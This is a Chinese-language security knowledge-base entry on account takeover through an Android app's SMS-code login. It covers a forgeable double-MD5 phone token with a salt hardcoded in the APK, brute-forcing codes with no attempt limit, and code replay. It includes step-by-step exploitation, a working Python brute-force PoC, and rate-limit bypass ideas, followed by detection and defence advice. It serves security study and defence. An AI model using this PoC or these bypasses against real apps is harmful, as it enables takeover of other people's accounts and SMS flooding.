---
id: mobile-android-sms-login-code-bruteforce-replay
title: 短信验证码登录账户接管：双 MD5 手机号 token 伪造 + 无次数限制爆破 + 验证码重放
type: scenario
domain: mobile
path: mobile/android
technique: android-sms-login-code-bruteforce-replay
tags:
- android
- auth
- sms
- otp
- bruteforce
- replay
- token
- md5
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V122
  verified_at: '2026-11-06T04:09:03+08:00'
  notes: 已对照原文与截图核对：getEncryptelCode=md5(md5(phone.substring(3)+硬编码盐))、login/sms 仅 phone+code、2000余次爆破命中验证码、同一验证码重放仍可登录、响应含 token/secret 均一致。未验证点：未复跑爆破脚本，盐值在截图中部分打码。
url: /docs/mobile/android/mobile-android-sms-login-code-bruteforce-replay/
draft: false
kb_aliases:
- 短信验证码登录爆破
- 验证码重放
- 手机号 token 伪造
- 双 MD5 加盐
- 任意账号登录
- 短信轰炸/枚举
---

## 一句话结论

APP 的短信登录接口把 `token = MD5(MD5(手机号后 8 位 + 硬编码盐))` 作为发码签名，token 完全可离线伪造；同时登录接口对 6 位验证码没有尝试次数限制、验证码成功后仍可重放，攻击者可对任意手机号爆破验证码并直接登录/接管账号。

## 原理

- 发码接口 `sms/auth-new` 需要 `phone` 与 `token` 两个参数；`getEncryptelCode(phone)` 的实现是 `md5(md5(phone.substring(3) + "_android_xxx_1998"))`，盐值硬编码在 APK 中。
- 由于算法完全在客户端、无服务端密钥/HMAC，攻击者反编译或抓包即可复现；给定任意手机号都能算出合法 token，绕过“签名校验”。
- 登录接口 `login/sms` 只用 `phone + code`，服务端没有把验证码与发送会话/手机号严格绑定，也没有按手机号/IP/设备做尝试次数限制；6 位数字空间可在数千次请求内命中。
- 验证码成功使用后没有立即失效，重放同一 `phone + code` 仍可登录；结合任意注册/忘记密码入口，可接管已有账号或批量注册。
- 该链路的根因是“客户端可信 + 验证码一次性/限速缺失”：token 只是防篡改的假象，验证码才是唯一认证因子，而它可被穷举和重放。

## 触发条件

- APP 使用手机号 + 短信验证码登录，发码接口带客户端生成的 token/签名。
- token 算法可从 APK 还原（硬编码盐、无 HMAC/服务端随机数）。
- 登录接口对验证码没有次数限制、过期/一次性校验，或限制可绕过。
- 攻击者能访问发码/登录接口，且目标手机号可任意指定。

## 利用步骤

1. 反编译 APK，搜索 `login/sms`、`sms/auth-new`、`getEncryptelCode`、`md5` 等，还原 token 算法与盐值。
2. 用任意手机号请求发码，抓包确认 `phone`、`token`、`code` 字段与响应格式。
3. 用 Python/脚本复现 token：`md5(md5(phone[3:] + salt))`，验证与抓包 token 一致。
4. 对目标手机号发送验证码；对 `login/sms` 的 `code` 参数做 000000–999999 爆破，按响应长度/状态/关键字筛选成功。
5. 命中后保存返回的 token/secret/session，验证是否为目标账号；尝试重放同一验证码确认未失效。
6. 在授权范围内评估任意注册、忘记密码、账号枚举等衍生影响；控制请求频率，避免短信轰炸。

## PoC

```python
import hashlib
import requests

BASE = "https://target"
SALT = "_android_xxx_1998"   # 从 APK 还原

def token_for(phone: str) -> str:
    s = phone[3:] + SALT
    return hashlib.md5(hashlib.md5(s.encode()).hexdigest().encode()).hexdigest()

def send_code(phone: str):
    data = {"phone": phone, "token": token_for(phone)}
    return requests.post(f"{BASE}/v1/sms/auth-new", data=data, timeout=10)

def try_login(phone: str, code: str):
    return requests.post(f"{BASE}/v1/login/sms",
                         data={"phone": phone, "code": code}, timeout=10)

phone = "18888888888"
print(send_code(phone).text)
for code in range(1000000):
    r = try_login(phone, f"{code:06d}")
    if '"state":200' in r.text or '"msg":"ok"' in r.text:
        print("code =", code, r.text)
        break
```

## 变体与关联

- 变体：验证码 4 位（0000–9999）更容易；6 位需要更多请求但仍可行。
- 变体：token 算法可能是 `MD5(phone+timestamp+salt)`、`MD5(phone+sign)`；按实际拼接还原。
- 变体：有次数限制时尝试更换 IP/设备/会话、竞态、验证码回显、短信轰炸接口。
- 关联：[[web-generic-auth-2fa-user-parameter-tampering-code-bruteforce]]（2FA 验证码爆破）、[[web-generic-auth-sms-code-echo-response-arbitrary-login]]（验证码回显）、[[mobile-android-token-md5-account-timestamp-sign-reverse]]（MD5 token 逆向）。

## 检测与防御

- 防御：token 使用服务端密钥的 HMAC/签名，不要把盐硬编码在客户端；发码与登录接口做设备/会话绑定。
- 防御：验证码一次性、短有效期、按手机号/IP/设备限速、失败锁定；禁止重放；关键操作二次验证。
- 检测：同一手机号/ IP 高频请求发码或登录、验证码错误率异常、同一验证码多次使用。
- 响应：确认账户接管后强制下线/重置会话，轮换相关密钥，审计历史登录与敏感操作。
